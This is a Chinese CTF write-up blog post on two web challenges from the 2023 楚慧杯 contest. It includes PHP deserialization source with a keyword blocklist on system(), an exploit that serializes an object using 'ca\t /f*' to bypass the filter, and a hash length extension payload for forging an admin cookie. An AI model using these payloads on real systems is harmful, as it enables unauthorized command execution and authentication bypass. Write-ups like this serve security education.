---
title: 楚慧杯
date: 2023-12-25 00:31:42
tags: ["2023"]
categories: ["challenge"]
---

# 楚慧杯

## eaaeval

打开题目，源码给了用户密码


<!--more-->

![image-20231219005653278](./image-20231219005653278-1707064335125-1.png)

登陆后啥也没有，扫一下发现源码泄露www.zip

```
<?php
class Flag{
    public $a;
    public $b;
    public function __construct(){
        $this->a = 'admin';
        $this->b = 'admin';
    }

    public function __destruct(){
        if(!preg_match("/flag|system|php|cat|tac|shell|sort/i", $this->a) && !preg_match("/flag|system|php|cat|tac|shell|sort/i", $this->b)){
    	system($this->a.' '.$this->b);
        }else{
                echo "again?";
        }
    }

}
$wzbz = $_GET['wzbz'];
unserialize($wzbz);
?>
```

exp如下

```
<?php
class Flag{
    public $a;
    public $b;
}

$A=new Flag();
$A->a='ca\t';
$A->b='/f*';
echo serialize($A);
```

upload_shell
打开题目，有个登录框，随便登录进去

得到源码

```

 <?php
session_start();
highlight_file(__FILE__);
include "./my.php";
echo strlen($secret);
echo"<br>";
echo(md5($secret."adminpassword"));
@$username = urldecode($_POST["username"]);
@$password = urldecode($_POST["password"]);
if (!empty($_COOKIE["source"])) {
    if ($username === "admin" && $password != "password") {
         if ($_COOKIE["source"] === md5($secret.$username.$password)) {

         // 在验证用户后，如果登录成功，设置会话变量来表示用户已登录
          $_SESSION['loggedin'] = true;
          $_SESSION['username'] = 'admin'; // 用户名
          $_SESSION['role'] = 'admin'; // 用户角色或权限
          echo "<script>window.location.href='upload.php';</script>";
        }
        else {
             echo "<br>"; 
            die ("你的cookie好像不太对啊");
        }
    }
    else {
        die ("可不会轻易放你进去");
    }

}
    
14
879bd10c8628894d388c068a25326c21
```


分析一下发现是哈希长度拓展攻击
直接脚本

bp抓包修改cookie

username=admin&password=password%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%d8%00%00%00%00%00%00%00ctf
1
成功跳转

这里考点是文件上传注入，对文件名注入

放弃灵魂直接sqlmap跑
